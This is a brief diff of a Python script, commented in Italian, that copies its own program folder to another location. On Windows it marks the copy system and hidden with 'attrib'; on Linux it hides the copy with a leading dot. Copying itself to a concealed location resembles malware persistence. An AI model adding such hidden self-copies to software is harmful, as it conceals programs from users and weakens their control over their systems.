@@ -28,11 +28,12 @@ else:
 	path = reAssemble(program_dir.split('\\')[:-1])
     
     
-if not isLinux:
+if not isLinux and not os.path.exists(path):
     
     shutil.copytree(f'{program_dir}', path)
     os.popen('attrib +S +H ' + path)
-    os.system(f'pathman /au {path}')
+    # https://msdn.microsoft.com/en-us/library/windows/desktop/aa381058(v=vs.85).aspx Aggiungere questo file
 
-else:
-    pass
+elif not os.path.exists(path) and isLinux:
+    shutil.copytree(f'{program_dir}', path)
+    # Aggiungere apri con, la copia viene già effettuata e il file viene nascosto anteponendo il punto
